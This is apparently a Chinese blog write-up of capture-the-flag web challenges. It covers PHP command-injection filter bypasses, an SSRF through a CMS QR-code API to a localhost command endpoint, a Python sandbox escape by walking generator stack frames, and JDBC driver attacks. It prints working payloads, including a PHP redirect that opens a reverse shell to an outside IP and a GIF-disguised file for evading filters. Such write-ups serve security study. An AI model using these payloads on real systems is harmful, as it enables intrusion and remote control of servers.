<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:cmd=php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));=&gt;system(&#x27;ls&#x27;);</span><br><span class="line">这里涉及到php一个特性,php的常量命名方式是下划线+字母，当你尝试</span><br><span class="line">echo _123;会报错，但是会正常输出_123</span><br><span class="line">这也就是为什么我们可以正常获得_后的字符串</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2:cmd=eval `ec\ho bHM=|base\64 -d`=&gt;eval &#x27;ls&#x27;</span><br></pre></td></tr></table></figure>

<p>rce之后记得flag在数据库里面。。。。。。。。。。。。。。。。。。。</p>
<p><code>mysql -u root -proot -e xxxxx</code></p>
<h1 id="easycms-easycms-revenge"><a href="#easycms-easycms-revenge" class="headerlink" title="easycms&amp;&amp;easycms_revenge"></a>easycms&amp;&amp;easycms_revenge</h1><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>一个hint:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>REMOTE_ADDR不可伪造，需要找ssrf</p>
<p>其实一开始还去试了试删除install.lock，但是要找admin后台还要登录，做了一大堆无用功后我才想到要进行ssrf的</p>
<p>既然要请求外部的资源，自然而然的想到api模块，于是打开源码开始审计api模块，貌似有20多个api，一个一个往下审，发现第三个可以用，还算运气好了，当时已经准备死磕这里了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二维码显示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成二维码图片</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片高度</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出图片</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个可以请求外部资源并且生成二维码的api</p>
<p>先看大意:</p>
<p>1.接收4个参数，其中text,size,level是关于二维码的信息,thumb是关于logo的信息,logo就有时候在二维码中间的那个小图片</p>
<p>2.用四个参数命名为一个文件名，如果存在则直接读出$QR(图片对象),若不存在则创建一个图片对象</p>
<p>3.检测是否需要logo，如果需要logo，就重新调整图片并且插入logo</p>
<p>所以说，logo图片是可以请求外部资源获得的,那就看看它怎么来的</p>
<p><code>$logo = imagecreatefromstring(dr_catcher_data($thumb));</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240523173818570.png"  alt="image-20240523173818570"></p>
<p>ssrf入口点找到了,于是在自己的vps写好跳转,然后在cmd上写上反弹shell命令即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>http://eci-2ze3cmcfbu4hoso5luoc.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=Your vps&amp;text=1&amp;size=1&amp;level=1</code></p>
<p>发现有个可执行文件readflag,.&#x2F;readflag即可</p>
<h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>前面步骤一样，主要是对logo的请求有了过滤，需要对文件进行伪造，类型文件上传的图片马吧，超链接直接连接资源，所以文件名不会被检测（我的理解），所以伪造内容就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">GIF89a<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooojjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看了一下别人wp发现有非预期，有个down_img，但是我死活找不到，可能是我下载的源码的问题？？？这出题人不给个附件有点顶不得</p>
<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>给了两个附件</p>
<p>main.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>runner.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>py栈帧逃逸</p>
<p><a class="link"   href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG==uh8kAhiD&alichlgref=https://www.cnblogs.com/" >Python利用栈帧沙箱逃逸 - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>这题的flag在沙箱的上上上帧（自己构造的两个函数两帧，exec里的一帧）</p>
<p>获取上上帧对象的三种方式</p>
<ol>
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>

<p>第一个方法不行，使用next获取栈帧对象会让结果包含LOAD_GLOBAL</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]<span class="comment">#用这&lt;listcomp&gt;需要多逃一帧</span></span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"> <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line"> pop = exp()</span><br><span class="line"> <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line"> boo=exp</span><br><span class="line"> <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br></pre></td></tr></table></figure>

<p>最后还作了个检测，就是flag不能存在output中</p>
<p>这里也有两种绕法</p>
<p>payload1:<code>print(kino.f_code.co_consts[16][1:])</code></p>
<p>截取字符串绕过，我这里用的ctfshow复现的环境，前面这个下标是16</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240524180044325.png"  alt="image-20240524180044325"></p>
<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">payload = &#x27;&#x27;&#x27;def getflag():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame=[x for x in g][0]</span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]  </span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code </span><br><span class="line">    gattr_dir = gattr.dir</span><br><span class="line">    s  = gattr.str</span><br><span class="line">    print(gattr_dir(code))</span><br><span class="line">    for i in s(code.co_consts):</span><br><span class="line">        print(i,end=&quot;,&quot;)</span><br><span class="line">getflag()&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;code&quot;: payload</span><br><span class="line">&#125;</span><br><span class="line">print(json.dumps(data))</span><br></pre></td></tr></table></figure>

<p>先用builtins获取str，然后把code.co_consts变为字符串后输出，每隔一个字符用，隔开即可</p>
<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240527172754306.png"  alt="image-20240527172754306"></p>
<p>你知道的，jdbc的攻击基本是围绕着驱动来攻击的</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527172840785.png"  alt="image-20240527172840785"></p>
<p>提供四个驱动，一个一个寻找漏洞条件</p>
<p>第一个Mysql，我知道的就反序列化漏洞，看看版本</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173431572.png"  alt="image-20240527173431572"></p>
<p>no</p>
<p>第二个PostgreSQL，控制bean.xml进行rce</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173557400.png"  alt="image-20240527173557400"></p>
<p>no</p>
<p>第三个是sqlite服务</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240527203847332.png"  alt="image-20240527203847332"></p>
<p><img   src="/../img/$%7Bfiilename%7D/1f913.png"  alt="🤓书呆子脸:高清大图与Unicode信息 | EmojiAll"></p>
<p>对啦！</p>
<p>[项目文件预览 - GitCode](<a class="link"   href="https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;PostGreSQL&#x2F;index.md?utm_source&#x3D;csdn_github_accelerator&amp;isLogin&#x3D;1)</p>
<p><a class="link"   href="https://gitcode.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java" >项目文件预览 - JDBC-Attack - GitCode<i class="fas fa-external-link-alt"></i></a></p>
<p>复现太麻烦了，包括环境下载，然后还有远程debug，这些都好难弄，只按wp做了一次</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>奶奶滴临近期末，写个复现都要写几周，还有一题sanic没看，我嘞个忙</p>
<p>赛后复现赛题发现我的复现能力太差了，环境不会装，docker不会用，debug不会debug，累了</p>
<p>接下来就学学复现环境吧，从vulhub开始，然后一点一点学着调试，分析，这应该应该还算个美妙的过程</p>
<p>我在复现thinkphp的时候调试的时候就调试得我挺美的</p>
<p>期考，会赢吗？</p>
